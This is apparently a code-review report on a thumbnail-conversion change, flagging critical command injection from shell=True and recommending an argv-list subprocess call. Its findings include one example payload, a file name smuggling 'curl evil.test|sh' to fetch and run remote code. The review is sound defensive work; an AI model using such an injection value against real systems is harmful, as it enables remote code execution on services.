findings.body:
**Command injection via `shell=True`.** `upload_dir`, `name`, and `oid` are interpolated into a single shell string. A value such as `name="x.png; curl evil.test|sh"` (or metacharacters in `upload_dir` / `oid`) runs arbitrary commands as the service user.

ImageMagick policy delegates do not require a shell — keep the argv-list form so arguments never pass through a shell:

```suggestion
    subprocess.run(
        ["/usr/bin/convert", f"{upload_dir}/{name}", f"/srv/thumbs/{oid}.png"],
        check=True,
    )
```

If IM7 needs the `magick` binary, use `["/usr/bin/magick", "convert", src, dst]` (still `shell=False`). Never switch to `shell=True` for this.

summary:
## Verdict

Critical security regression: this change introduces shell injection in thumbnail conversion and must not merge.

## Findings

| # | Severity | File | Summary |
|---|----------|------|---------|
| 1 | 🚨 critical | `thumbs.py:6` | `subprocess.run(..., shell=True)` with unquoted path interpolation enables command injection |

## Notes

ImageMagick 7 policy/delegate behavior does not require a shell. Keep the argv-list form (or an equivalent `shell=False` invocation). If the binary name changed under IM7, call `/usr/bin/magick` / `/usr/bin/convert` as a fixed absolute path with separate arguments.

`upload_dir`, `name`, and `oid` are all interpolated into the shell string. Any metacharacters in those values become shell syntax (`;`, `|`, `$(...)`, backticks, spaces, etc.). Removing the prior note about upstream `ALLOWED_FILES` validation makes the trust boundary even less clear; even with a regex, `shell=True` remains the wrong primitive here.

**Recommendation:** request-changes
